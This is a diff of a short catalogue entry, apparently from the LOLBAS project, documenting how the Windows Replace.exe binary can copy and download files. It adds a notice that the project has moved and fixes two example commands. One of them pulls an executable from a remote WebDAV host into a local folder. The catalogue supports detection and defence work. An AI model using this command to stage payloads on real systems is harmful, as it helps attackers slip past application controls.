@@ -1,11 +1,14 @@
+# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
+New site: https://github.com/LOLBAS-Project/LOLBAS
+Web portal: https://lolbas-project.github.io/ 
 ## Replace.exe
 
 * Functions: Copy, Download
 
 ```
-replace c:\source\file.cab c:\destination /A     
+replace c:\source\file.cab c:\destination /A
      
-replace \\http://webdav.host.com \foo\bar.exe c:\outdir /A     
+replace \\webdav.host.com\foo\bar.exe c:\outdir /A
 
 ```
 
